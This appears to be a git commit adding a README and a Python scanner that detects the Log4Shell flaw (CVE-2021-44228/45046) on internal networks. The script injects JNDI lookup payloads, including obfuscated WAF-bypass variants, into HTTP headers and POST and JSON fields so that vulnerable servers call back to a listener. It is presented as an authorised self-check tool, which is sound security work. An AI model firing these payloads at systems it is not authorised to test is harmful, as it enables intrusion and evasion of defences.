c6c03318dc82c187e6db3ac6cf0122bcc5b079b6
k3rwin <791543130@qq.com>
2021-12-24 17:35:38 +0800

    first

---
+++ README.md
@@ -0,0 +1,164 @@
+
+
+# Log4j2-intranet-scan
+
+![image-20211224164059264](README.assets/image-20211224164059264.png)
+
+## ⚠️免责声明
+
+---
+
+>本项目仅面向合法授权的企业安全建设行为，在使用本项目进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权
+>
+>如您在使用本项目的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任
+>
+>在使用本项目前，请您务必审慎阅读、充分理解各条款内容，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意
+>
+>除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要使用本项目
+>
+>您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束
+
+----
+
+## 1.Features(特性)
+
+- 该项目是一款无须借助`dnslog`且完全无害的`JNDI`反连检测工具，解析`RMI`和`LDAP`协议实现，可用于甲方内网自查
+
+- Support for lists of URLs.
+- Fuzzing for more than 60 HTTP request headers (not only 3-4 headers as previously seen tools).
+- Fuzzing for HTTP POST Data parameters.
+- Fuzzing for JSON data parameters.
+- WAF Bypass payloads.
+
+---
+
+## 2.Installation(安装)
+
+```
+$ pip3 install -r requirements.txt
+```
+
+---
+
+## 3.Usage(Jndi监听和记录)
+
+### win
+
+```shell
+JNDIScan-Windows.exe -p 8888
+```
+
+### Linux
+
+```shell
+./JNDIScan-Linux -p 8888
+```
+
+### Mac
+
+```shell
+./JNDIScan-Darwin -p 8888
+```
+
+![image-20211224170134585](README.assets/image-20211224170134585.png)
+
+---
+
+## 4.Usage(扫描)
+
+>需要配合jndi监听和记录工具使用，--server参数为 jndi监听的内网ip及端口
+
+```shell
+$ python3 log4j2-intranet-scan.py -h
+usage: log4j2-intranet-scan.py [-h] [-u URL] [-p PROXY] [-l USEDLIST] [--request-type REQUEST_TYPE]
+                               [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing]
+                               [--wait-time WAIT_TIME] [--waf-bypass] [--test-CVE-2021-45046] [--server SERVER]
+                               [--disable-http-redirects]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -u URL, --url URL     Check a single URL. example('http://vultest.com/test.jsp')
+  -p PROXY, --proxy PROXY
+                        send requests through proxy
+  -l USEDLIST, --list USEDLIST
+                        Check a list of URLs.
+  --request-type REQUEST_TYPE
+                        Request Type: (get, post) - [Default: get].
+  --headers-file HEADERS_FILE
+                        Headers fuzzing list - [default: headers.txt].
+  --run-all-tests       Run all available tests on each URL.
+  --exclude-user-agent-fuzzing
+                        Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.
+  --wait-time WAIT_TIME
+                        Wait time after all URLs are processed (in seconds) - [Default: 5].
+  --waf-bypass          Extend scans with WAF bypass payloads.
+  --test-CVE-2021-45046
+                        Test using payloads for CVE-2021-45046 (detection payloads).
+  --server SERVER       ldap_server
+  --disable-http-redirects
+                        Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have
+                        higher chance of reaching vulnerable systems.
+```
+
+### Scan a Single URL(GET)
+
+```shell
+$ python3 log4j2-intranet-scan.py --server "192.168.130.1:8888" -u https://vultest.com/login.jsp
+```
+
+### Scan a Single URL using all Request Methods: GET, POST (url-encoded form), POST (JSON body)
+
+
+```shell
+$ python3 log4j2-intranet-scan.py --server "192.168.130.1:8888" -u https://vultest.com/login.jsp --run-all-tests
+```
+
+### Discover WAF bypasses on the environment.
+
+```shell
+$ python3 log4j2-intranet-scan.py --server "192.168.130.1:8888" -u https://vultest.com/login.jsp --waf-bypass
+```
+
+### Scan a list of URLs
+
+```shell
+$ python3  log4j2-intranet-scan.py --server "192.168.130.1:8888" -l urls.txt
+```
+
+---
+
+## 5.Example(演示)
+
+>监听结果存储在当前文件夹下的`result.html`文件中,查看路径参数在批量扫描中可以定位到存在漏洞的`uri`，需要配合扫描生成的`scanfile.txt`中的随机路径参数使用
+
+### Single URL
+
+![image-20211224171847693](README.assets/image-20211224171847693.png)
+
+### Urllist
+
+![image-20211224171753055](README.assets/image-20211224171753055.png)
+
+---
+
+## 6.reference(参考/致谢)
+
+>站在巨人的肩膀上coding，该项目部分工具和代码来自以下两个项目
+
+[log4j-scan](https://github.com/fullhunt/log4j-scan)
+
+[JNDIScan](https://github.com/EmYiQing/JNDIScan)
+
+---
+
+## 7.docker(靶场)
+
+靶场环境来自雷石安全实验室
+
+```shell
+docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
+docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
+docker exec -it log4j_vuln_container /bin/bash
+/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh
+```
+
---
+++ log4j2-intranet-scan.py
@@ -0,0 +1,269 @@
+#!/usr/bin/env python3
+# coding=utf-8
+
+
+import argparse
+import random
+import requests
+import sys
+from urllib import parse as urlparse
+import random
+from colorama import Fore
+from tqdm import tqdm
+
+# Disable SSL warnings
+try:
+    import requests.packages.urllib3
+    requests.packages.urllib3.disable_warnings()
+except Exception:
+    pass
+
+
+def title():
+    print(Fore.YELLOW +"""
+                                                                                 
+,--.                   ,---.   ,--.  ,---.                                       
+|  |  ,---.   ,---.   /    |   `--' '.-.  \      ,---.   ,---.  ,--,--. ,--,--,  
+|  | | .-. | | .-. | /  '  |   ,--.  .-' .'     (  .-'  | .--' ' ,-.  | |      \ 
+|  | ' '-' ' ' '-' ' '--|  |   |  | /   '-.     .-'  `) \ `--. \ '-'  | |  ||  | 
+`--'  `---'  .`-  /     `--' .-'  / '-----'     `----'   `---'  `--`--' `--''--' 
+             `---'           '---'                                               
+""")
+    print(Fore.YELLOW + '\t\t\tCVE-2021-44228 Log4j2 RCE\r\n' + '\t\t\t\t\t' + Fore.LIGHTBLUE_EX + 'By:K3rwin' + Fore.RESET)
+
+
+default_headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
+    'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
+}
+post_data_parameters = ["username", "user", "email", "email_address", "password", "c"]
+timeout = 4
+
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{server}}/{{random}}}",
+                       "${${::-j}ndi:rmi://{{server}}/{{random}}}",
+                       "${jndi:rmi://{{server}}}",
+                       "${${lower:jndi}:${lower:rmi}://{{server}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://{{server}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{server}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{server}}/{{random}}}",
+                       "${jndi:dns://{{server}}}",
+                       ]
+
+cve_2021_45046 = [
+                  "${jndi:ldap://127.0.0.1#{{server}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+                  "${jndi:ldap://127.0.0.1#{{server}}/{{random}}}",
+                  "${jndi:ldap://127.1.1.1#{{server}}/{{random}}}"
+                 ]  
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--url",
+                    dest="url",
+                    help="Check a single URL. example('http://vultest.com/test.jsp')",
+                    action='store')
+parser.add_argument("-p", "--proxy",
+                    dest="proxy",
+                    help="send requests through proxy",
+                    action='store')
+parser.add_argument("-l", "--list",
+                    dest="usedlist",
+                    help="Check a list of URLs.",
+                    action='store')
+parser.add_argument("--request-type",
+                    dest="request_type",
+                    help="Request Type: (get, post) - [Default: get].",
+                    default="get",
+                    action='store')
+parser.add_argument("--headers-file",
+                    dest="headers_file",
+                    help="Headers fuzzing list - [default: headers.txt].",
+                    default="headers.txt",
+                    action='store')
+parser.add_argument("--run-all-tests",
+                    dest="run_all_tests",
+                    help="Run all available tests on each URL.",
+                    action='store_true')
+parser.add_argument("--exclude-user-agent-fuzzing",
+                    dest="exclude_user_agent_fuzzing",
+                    help="Exclude User-Agent header from fuzzing - useful to bypass weak checks on User-Agents.",
+                    action='store_true')
+parser.add_argument("--wait-time",
+                    dest="wait_time",
+                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
+                    default=5,
+                    type=int,
+                    action='store')
+parser.add_argument("--waf-bypass",
+                    dest="waf_bypass_payloads",
+                    help="Extend scans with WAF bypass payloads.",
+                    action='store_true')
+parser.add_argument("--test-CVE-2021-45046",
+                    dest="cve_2021_45046",
+                    help="Test using payloads for CVE-2021-45046 (detection payloads).",
+                    action='store_true')
+parser.add_argument("--server",
+                    dest="server",
+                    help="ldap_server",
+                    action='store')
+parser.add_argument("--disable-http-redirects",
+                    dest="disable_redirects",
+                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
+                    action='store_true')
+
+args = parser.parse_args()
+
+
+proxies = {}
+if args.proxy:
+    proxies = {"http": args.proxy, "https": args.proxy}
+
+def get_fuzzing_headers(payload):
+    fuzzing_headers = {}
+    fuzzing_headers.update(default_headers)
+    with open(args.headers_file, "r") as f:
+        for i in f.readlines():
+            i = i.strip()
+            if i == "" or i.startswith("#"):
+                continue
+            fuzzing_headers.update({i: payload})
+    if args.exclude_user_agent_fuzzing:
+        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
+
+    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
+    return fuzzing_headers
+
+
+def get_fuzzing_post_data(payload):
+    fuzzing_post_data = {}
+    for i in post_data_parameters:
+        fuzzing_post_data.update({i: payload})
+    return fuzzing_post_data
+
+
+def generate_waf_bypass_payloads(server, random_string):
+    payloads = []
+    for i in waf_bypass_payloads:
+        new_payload = i.replace("{{server}}", server)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
+
+def get_cve_2021_45046_payloads(server, random_string):
+    payloads = []
+    for i in cve_2021_45046:
+        new_payload = i.replace("{{server}}", server)
+        new_payload = new_payload.replace("{{random}}", random_string)
+        payloads.append(new_payload)
+    return payloads
+
+
+def parse_url(url):
+    """
+    Parses the URL.
+    """
+
+    # Url: https://example.com/login.jsp
+    url = url.replace('#', '%23')
+    url = url.replace(' ', '%20')
+
+    if ('://' not in url):
+        url = str("http://") + str(url)
+    scheme = urlparse.urlparse(url).scheme
+
+    # FilePath: /login.jsp
+    file_path = urlparse.urlparse(url).path
+    if (file_path == ''):
+        file_path = '/'
+
+    return({"scheme": scheme,
+            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
+            "host":  urlparse.urlparse(url).netloc.split(":")[0],
+            "file_path": file_path})
+
+
+def scan_url(url, server, scan_log):
+    parsed_url = parse_url(url)
+    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
+    payload = '${jndi:ldap://%s/%s}' % (server, random_string)
+    payloads = [payload]
+    if args.waf_bypass_payloads:
+        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{server}', random_string))
+    if args.cve_2021_45046:
+        print(Fore.YELLOW + f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)" + Fore.RESET)
+        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{server}', random_string)
+    for payload in payloads:
+        scan_log.append(f"[•] URL: {url} | PAYLOAD: {payload}\n")
+        if args.request_type.upper() == "GET" or args.run_all_tests:
+            try:
+                requests.request(url=url,
+                                 method="GET",
+                                 params={"v": payload},
+                                 headers=get_fuzzing_headers(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                print(f"EXCEPTION: {e}")            
+
+        if args.request_type.upper() == "POST" or args.run_all_tests:
+            try:
+                # Post body
+                requests.request(url=url,
+                                 method="POST",
+                                 headers=get_fuzzing_headers(payload),
+                                 data=get_fuzzing_post_data(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                print(f"EXCEPTION: {e}")
+
+            try:
+                # JSON body
+                requests.request(url=url,
+                                 method="POST",
+                                 headers=get_fuzzing_headers(payload),
+                                 json=get_fuzzing_post_data(payload),
+                                 verify=False,
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
+            except Exception as e:
+                print(f"EXCEPTION: {e}")
+
+def main():
+    title()
+    if len(sys.argv) <= 1:
+        print(Fore.RED + 'python3 %s -h for help.' % (sys.argv[0]) + Fore.RESET)
+        exit(0)
+    scan_log = []
+    urls = []
+    if args.url:
+        urls.append(args.url)
+    if args.usedlist:
+        with open(args.usedlist, "r") as f:
+            for i in f.readlines():
+                i = i.strip()
+                if i == "" or i.startswith("#"):
+                    continue
+                urls.append(i)
+
+    ldap_server = args.server
+
+    print(Fore.RED + "[%] Checking for Log4j RCE CVE-2021-44228." + Fore.RESET)
+    for url in tqdm(urls, position=0):
+        scan_url(url, ldap_server, scan_log)
+    with open('scanfile.txt','w+') as f:
+        for x in scan_log:
+            f.write(x)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Fore.RED + "\nKeyboardInterrupt Detected." + Fore.RESET)
+        print(Fore.GREEN + "Exiting..." + Fore.RESET)
+        exit(0)
